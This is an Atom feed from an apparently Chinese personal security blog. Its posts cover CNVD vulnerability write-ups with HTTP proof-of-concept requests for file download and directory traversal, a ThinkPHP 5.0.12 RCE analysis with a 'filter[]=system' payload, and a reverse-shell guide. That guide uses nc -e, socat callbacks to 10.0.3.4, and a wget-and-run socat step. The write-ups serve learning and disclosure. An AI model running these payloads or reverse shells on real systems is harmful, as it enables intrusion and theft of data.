<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Airz&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/4ab2831da43290598b641ba747bb9290</icon>
  <subtitle>I haven&#39;t read it yet, but I bet it&#39;s a lot.</subtitle>
  <link href="http://yoursite-url/atom.xml" rel="self"/>
  
  <link href="http://yoursite-url/"/>
  <updated>2024-10-02T11:37:24.000Z</updated>
  <id>http://yoursite-url/</id>
  
  <author>
    <name>Airz</name>
    <email>ruozhaoyang@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Attack Database</title>
    <link href="http://yoursite-url/blogs/Attack-Database/"/>
    <id>http://yoursite-url/blogs/Attack-Database/</id>
    <published>2024-10-02T11:37:24.000Z</published>
    <updated>2024-10-02T11:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>记录一下优秀的 Attack 数据集，方便查找使用。</em></p><h2 id="MITRE-ATT-CK">MITRE ATT&amp;CK</h2><p>Description: Attack Framework, especially for APT, i.e. <strong>TTP</strong></p><p>Link:  <a href="https://attack.mitre.org/">https://attack.mitre.org/</a></p><p><img src="/img/blog_img/attackdb/attackdb_01.png" alt=""></p><h2 id="Automated-Tools-List">Automated Tools List</h2><p>Paper: Understanding Hackers’ Work</p><p>Link: <a href="https://dl.acm.org/doi/pdf/10.1145/3611643.3613900">https://dl.acm.org/doi/pdf/10.1145/3611643.3613900</a></p><p><img src="/img/blog_img/attackdb/attackdb_02.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;记录一下优秀的 Attack 数据集，方便查找使用。&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;MITRE-ATT-CK&quot;&gt;MITRE ATT&amp;amp;CK&lt;/h2&gt;
&lt;p&gt;Description: Attack Framework, especially for APT,</summary>
      
    
    
    
    <category term="research" scheme="http://yoursite-url/categories/research/"/>
    
    
    <category term="llm4sec" scheme="http://yoursite-url/tags/llm4sec/"/>
    
  </entry>
  
  <entry>
    <title>咕咕咕</title>
    <link href="http://yoursite-url/blogs/%E5%92%95%E5%92%95%E5%92%95/"/>
    <id>http://yoursite-url/blogs/%E5%92%95%E5%92%95%E5%92%95/</id>
    <published>2024-09-07T17:09:02.000Z</published>
    <updated>2024-09-07T17:09:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>果然 blog 虽迟但鸽 ：）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;果然 blog 虽迟但鸽 ：）&lt;/p&gt;
</summary>
      
    
    
    
    <category term="碎碎念合集" scheme="http://yoursite-url/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5%E5%90%88%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>Interview Q&amp;A</title>
    <link href="http://yoursite-url/blogs/Interview-Q-A/"/>
    <id>http://yoursite-url/blogs/Interview-Q-A/</id>
    <published>2024-03-31T13:21:33.000Z</published>
    <updated>2024-03-31T13:21:33.000Z</updated>
    
    <content type="html"><![CDATA[<p><s><em>暂时不重要了，但反正当时都写了一点了就放上来，后面有空再搞吧</em></s></p><p><strong>Q：信息收集如何处理子域名爆破的泛解析问题</strong></p><p>A：黑名单 ip / TTL(Time To Live) / 回显（响应内容）</p><p><strong>Q：如何绕过CDN查找真实ip</strong></p><p>A：</p><ol><li>验证CDN：超级ping / nslookup</li><li>绕过CDN：DNS / 微步 / <a href="http://tools.ipip.net">tools.ipip.net</a> / fofa / 根据回显人工判断（e.g. icon有唯一hash值）/ 境外主机访问解析 / 邮件订阅sendmail / F5 LTM负载均衡（CTF遇到过，通过对set-cookie关键字的解码真实ip也可被获取）</li></ol><p><strong>Q：phpinfo关注哪些信息</strong></p><p>A：</p><ol><li><p>php版本</p></li><li><p>系统版本信息</p></li><li><p>配置文件 php.ini 位置</p></li><li><p>Command（扩展功能）</p><p>Streams &amp; Filters（文件包含、反序列化、bypass）</p></li><li><p>Core：allow_url_fopen / allow_url_include / disable_functions / 调试的错误提示 / enable_dl（Apache 动态加载） / extension_dir（和enable_dl配合）/ include_path / open_basedir（文件读取）/ short_open_tag（写shell用，判断服务器是不是支持短标签）</p></li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enable_d<span class="variable">l:</span></span><br><span class="line"></span><br><span class="line">该指令仅对 Apache 模块版本的 PHP 有效。 你可以针对每个虚拟机或每个目录开启或关闭 <span class="keyword">dl</span>() 动态加载 PHP 模块。</span><br><span class="line"></span><br><span class="line">关闭动态加载的主要原因是为了安全。通过动态加载，有可能忽略所有 open_basedir 限制。 默认允许动态加载，除了使用 安全模式。在安全模式，总是无法使用 <span class="keyword">dl</span>()。</span><br></pre></td></tr></table></figure><ol start="6"><li><p>phar</p></li><li><p>session：session.save_path / session.save_handler（用户自定义存储函数，如数据库）/ session.serialize_handler=php</p><p>（文件包含，CTF常见）</p></li><li><p>变量：_SERVER[‘PATH’]（windows特有，能显示出系统的所有环境变量）/ _SERVER[“SCRIPT_FILENAME”]（绝对路径，写shell用）/ _SERVER[“SERVER_ADDR”]（真实ip，直接绕过CDN）/ _FILES[“filename”]（文件包含getshell）</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;s&gt;&lt;em&gt;暂时不重要了，但反正当时都写了一点了就放上来，后面有空再搞吧&lt;/em&gt;&lt;/s&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Q：信息收集如何处理子域名爆破的泛解析问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A：黑名单 ip / TTL(Time To Live) / 回显（响应内</summary>
      
    
    
    
    <category term="面经" scheme="http://yoursite-url/categories/%E9%9D%A2%E7%BB%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo常用操作</title>
    <link href="http://yoursite-url/blogs/Hexo%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite-url/blogs/Hexo%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</id>
    <published>2024-01-28T13:27:48.000Z</published>
    <updated>2024-01-28T13:27:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>避免太久不用忘了……</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> hexo n <span class="string">&quot;xxxx&quot;</span>  ==&gt; 创建新blog.md</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hexo p   ==&gt; publish，发布草稿</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hexo g   ==&gt; generate，生成</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hexo s   ==&gt; server，服务预览</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hexo d   ==&gt; deploy，部署到github</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;避免太久不用忘了……&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/sp</summary>
      
    
    
    
    <category term="Blog维护" scheme="http://yoursite-url/categories/Blog%E7%BB%B4%E6%8A%A4/"/>
    
    
    <category term="hexo" scheme="http://yoursite-url/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>Restart</title>
    <link href="http://yoursite-url/blogs/From-The-Very-Beginning/"/>
    <id>http://yoursite-url/blogs/From-The-Very-Beginning/</id>
    <published>2024-01-28T12:35:32.000Z</published>
    <updated>2024-01-28T12:35:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>会点CTF，挖点小洞，做过攻防，备考一年技术退步了，努力把复健记录和笔记同步上来，争取不鸽（？）</p><p>随性写，随机更（。）</p><p><img src="/img/blog_img/jct01.png" alt=""></p><p>放个小檀美照感谢阅读。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;会点CTF，挖点小洞，做过攻防，备考一年技术退步了，努力把复健记录和笔记同步上来，争取不鸽（？）&lt;/p&gt;
&lt;p&gt;随性写，随机更（。）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/blog_img/jct01.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;放个小檀美照感谢阅读。&lt;/</summary>
      
    
    
    
    <category term="碎碎念合集" scheme="http://yoursite-url/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5%E5%90%88%E9%9B%86/"/>
    
    
    <category term="Introduction" scheme="http://yoursite-url/tags/Introduction/"/>
    
  </entry>
  
  <entry>
    <title>CNVD-2023-4**41</title>
    <link href="http://yoursite-url/blogs/CNVD-2023-4**41/"/>
    <id>http://yoursite-url/blogs/CNVD-2023-4**41/</id>
    <published>2023-06-05T06:40:27.000Z</published>
    <updated>2023-06-05T06:40:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>某平台系统存在任意文件下载漏洞，攻击者可利用该漏洞下载系统敏感信息，影响范围涉及全国大部分高校，现已修复。</p><p><img src="/img/blog_img/cnvd/cnvd_03.png" alt=""></p><h2 id="漏洞分析">漏洞分析</h2><p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/theorytest/student/ExamManage.class</code></p><p><code>down</code> 方法，路由是 <code>/student/exam/down.do</code></p><p><img src="/img/blog_img/cnvd/cnvd_04.png" alt=""></p><p>获取 <code>path</code> 参数，拼接成 <code>realPath</code> ,然后用输出流写出文件。</p><h2 id="漏洞复现">漏洞复现</h2><p>POC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/student/exam/down.do?path=xxxx（文件路径）</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;某平台系统存在任意文件下载漏洞，攻击者可利用该漏洞下载系统敏感信息，影响范围涉及全国大部分高校，现已修复。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/blog_img/cnvd/cnvd_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2</summary>
      
    
    
    
    <category term="CNVD" scheme="http://yoursite-url/categories/CNVD/"/>
    
    
    <category term="cnvd" scheme="http://yoursite-url/tags/cnvd/"/>
    
  </entry>
  
  <entry>
    <title>linux交互式shell</title>
    <link href="http://yoursite-url/blogs/linux%E4%BA%A4%E4%BA%92shell/"/>
    <id>http://yoursite-url/blogs/linux%E4%BA%A4%E4%BA%92shell/</id>
    <published>2023-05-17T14:04:56.000Z</published>
    <updated>2023-05-17T14:04:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>shell提权后搞搞交互</p><p>普通的反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.3.4 4444</span><br></pre></td></tr></table></figure><h2 id="Python-pty-module">Python pty module</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/blog_img/linux/linux_01.png" alt=""></p><h2 id="Socat">Socat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure><p>靶机未安装socat：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure><p><img src="/img/blog_img/linux/linux_02.png" alt=""></p><h2 id="Upgrade-from-netcat">Upgrade from netcat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.3.4 4444</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+<span class="keyword">Z</span></span><br></pre></td></tr></table></figure><p><img src="/img/blog_img/linux/linux_03.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$TERM</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty -a</span><br></pre></td></tr></table></figure><p><img src="/img/blog_img/linux/linux_04.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty raw -<span class="built_in">echo</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fg</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset</span><br></pre></td></tr></table></figure><p><img src="/img/blog_img/linux/linux_05.png" alt=""></p><p>（nc行为前台活动自动显现，不需要手打执行）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> TERM=xterm256-color <span class="comment">#从echo $TERM获取的</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ stty rows 38 columns 116</span><br></pre></td></tr></table></figure><p><img src="/img/blog_img/linux/linux_06.png" alt=""></p><p>甚至可以获取密钥建立远程连接</p><p><img src="/img/blog_img/linux/linux_07.png" alt=""></p><p>总结：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">Ctrl-Z</span><br><span class="line"></span><br><span class="line"><span class="comment"># In Kali</span></span><br><span class="line">$ stty raw -<span class="built_in">echo</span></span><br><span class="line">$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In reverse shell</span></span><br><span class="line">$ reset</span><br><span class="line">$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</span><br></pre></td></tr></table></figure><h2 id="script-pty">script pty</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜ nc -lv 9999</span><br><span class="line">root@46958b799745:/tmp<span class="comment"># tty</span></span><br><span class="line">tty</span><br><span class="line">not a tty</span><br><span class="line">root@46958b799745:/tmp<span class="comment"># script /dev/null</span></span><br><span class="line">script /dev/null</span><br><span class="line"><span class="comment"># tty</span></span><br><span class="line">tty</span><br><span class="line">/dev/pts/1</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="MSF-staekka-Module">MSF staekka Module</h2><p><a href="https://github.com/j-0-t/staekka">https://github.com/j-0-t/staekka</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;shell提权后搞搞交互&lt;/p&gt;
&lt;p&gt;普通的反弹shell&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre</summary>
      
    
    
    
    <category term="linux提权" scheme="http://yoursite-url/categories/linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="linux" scheme="http://yoursite-url/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>CNVD-2023-3**48</title>
    <link href="http://yoursite-url/blogs/CNVD-2023-3**48/"/>
    <id>http://yoursite-url/blogs/CNVD-2023-3**48/</id>
    <published>2023-04-23T12:23:32.000Z</published>
    <updated>2023-04-23T12:23:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>某平台任意文件下载，攻击者可利用该漏洞下载系统敏感信息，影响范围涉及全国大部分高校，现已修复。</p><p><img src="/img/blog_img/cnvd/cnvd_01.png" alt=""></p><h2 id="漏洞分析">漏洞分析</h2><p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/theorytest/teacher/Exammanage.class</code></p><p><code>down</code> 方法，路由是 <code>/teacher/resourcemanager/exam/exammanage/down.do</code></p><p><img src="/img/blog_img/cnvd/cnvd_02.png" alt=""></p><p>获取 <code>path</code> 参数，拼接成 <code>realPath</code> ,然后用输出流写出文件。</p><h2 id="漏洞复现">漏洞复现</h2><p>POC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/teacher/resourcemanager/exam/exammanage/down.do?path=xxxx（文件路径）</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;某平台任意文件下载，攻击者可利用该漏洞下载系统敏感信息，影响范围涉及全国大部分高校，现已修复。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/blog_img/cnvd/cnvd_01.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
&lt;p&gt;漏</summary>
      
    
    
    
    <category term="CNVD" scheme="http://yoursite-url/categories/CNVD/"/>
    
    
    <category term="cnvd" scheme="http://yoursite-url/tags/cnvd/"/>
    
  </entry>
  
  <entry>
    <title>CNVD-2023-3**63</title>
    <link href="http://yoursite-url/blogs/CNVD-2023-3**63/"/>
    <id>http://yoursite-url/blogs/CNVD-2023-3**63/</id>
    <published>2023-04-23T06:51:19.000Z</published>
    <updated>2023-04-23T06:51:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>某平台系统存在任意目录遍历漏洞，攻击者可利用该漏洞读取系统敏感信息，影响范围涉及全国大部分高校，现已修复。</p><p><img src="/img/blog_img/cnvd/cnvd_05.png" alt=""></p><h2 id="漏洞分析">漏洞分析</h2><p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/common/Uploader.class</code></p><p>路由是 <code>/common/getDrive.do</code></p><p><img src="/img/blog_img/cnvd/cnvd_06.png" alt=""></p><p>前面两个 if判断都是在 <code>type</code> 为 <code>library</code> 的时候进入，我们这里传入的是 <code>type=drives</code> ，直接进入到第三个 if语句；</p><p>调用 <code>File.listFiles</code> ，直接列出对应文件下的文件，然后放入到 <code>map</code> 中返回。</p><h2 id="漏洞复现">漏洞复现</h2><p>POC</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/common/getDrive.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36</span><br><span class="line"></span><br><span class="line">path=C%3A%5C（可继续加路由）&amp;type=drives&amp;extensions=</span><br></pre></td></tr></table></figure><p><img src="/img/blog_img/cnvd/cnvd_07.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;某平台系统存在任意目录遍历漏洞，攻击者可利用该漏洞读取系统敏感信息，影响范围涉及全国大部分高校，现已修复。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/blog_img/cnvd/cnvd_05.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2</summary>
      
    
    
    
    <category term="CNVD" scheme="http://yoursite-url/categories/CNVD/"/>
    
    
    <category term="cnvd" scheme="http://yoursite-url/tags/cnvd/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP V5.0.12 RCE</title>
    <link href="http://yoursite-url/blogs/TP5-0-12-RCE/"/>
    <id>http://yoursite-url/blogs/TP5-0-12-RCE/</id>
    <published>2021-11-14T02:43:55.000Z</published>
    <updated>2021-11-14T02:43:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>有很多网站采用的是ThinkPHP V5.0.12框架，其核心类Requests对变量属性校验不严，可以通过变量覆盖属性并结合框架特性对任意函数调用，实现任意代码执行。</p><h3 id="漏洞分析">漏洞分析</h3><h4 id="代码流程">代码流程</h4><p>首先在开启debug的时候会直接在下面的箭头处触发RCE，这里先关掉debug。</p><p><img src="/img/blog_img/tp5/tp5.0.12_01.png" alt=""></p><p>跟进routeCheck()</p><p>这里会调用Route类的check方法：</p><p><img src="/img/blog_img/tp5/tp5.0.12_02.png" alt=""></p><p>继续跟进check方法</p><p>这里会调用Request类的method方法：</p><p><img src="/img/blog_img/tp5/tp5.0.12_03.png" alt=""></p><p>跟进method方法</p><p>POST可以接收_method参数。根据接收到的参数值调用方法的核心漏洞点就在此：由于没有对参数进行严格限制，可以调用_construct，初始化filter变量。</p><p><img src="/img/blog_img/tp5/tp5.0.12_04.png" alt=""></p><p>继续跟进_construct方法</p><p><img src="/img/blog_img/tp5/tp5.0.12_05.png" alt=""></p><p>但此处只是设置了filter值，还需要进一步调用。</p><p>最终导致RCE的位置在filterValue中：</p><p><img src="/img/blog_img/tp5/tp5.0.12_06.png" alt=""></p><p>此方法被input()调用，input()又被多个方法进一步调用：</p><p><img src="/img/blog_img/tp5/tp5.0.12_07.png" alt=""></p><p>若开启debug，1处可以直接触发RCE：</p><p><img src="/img/blog_img/tp5/tp5.0.12_08.png" alt=""></p><p>未开启debug时，需要进一步跟进exec()。</p><p>此方法中调用了module方法：</p><p><img src="/img/blog_img/tp5/tp5.0.12_09.png" alt=""></p><p>module方法中会加载控制器：</p><p><img src="/img/blog_img/tp5/tp5.0.12_10.png" alt=""></p><p>controller会反射一个类：</p><p><img src="/img/blog_img/tp5/tp5.0.12_11.png" alt=""></p><p>invokeClass()调用bindParams方法：</p><p><img src="/img/blog_img/tp5/tp5.0.12_12.png" alt=""></p><p>最终调用param()触发RCE：</p><p><img src="/img/blog_img/tp5/tp5.0.12_13.png" alt=""></p><p>调用堆栈</p><p><img src="/img/blog_img/tp5/tp5.0.12_14.png" alt=""></p><h3 id="漏洞复现">漏洞复现</h3><h4 id="POC">POC</h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=<span class="keyword">index</span>/<span class="keyword">index</span></span><br><span class="line">s=whoami&amp;_method=_construct&amp;<span class="function"><span class="keyword">method</span>=<span class="title">POST</span>&amp;<span class="title">filter</span>[]=<span class="title">system</span></span></span><br></pre></td></tr></table></figure><h4 id="利用">利用</h4><p><img src="/img/blog_img/tp5/tp5.0.12_15.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;有很多网站采用的是ThinkPHP V5.0.12框架，其核心类Requests对变量属性校验不严，可以通过变量覆盖属性并结合框架特性对任意函数调用，实现任意代码执行。&lt;/p&gt;
&lt;h3 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h3&gt;
&lt;h4 id=&quot;代码流程&quot;&gt;代码流程&lt;/h4&gt;
</summary>
      
    
    
    
    <category term="代码审计" scheme="http://yoursite-url/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="ThinkPHP" scheme="http://yoursite-url/tags/ThinkPHP/"/>
    
  </entry>
  
</feed>
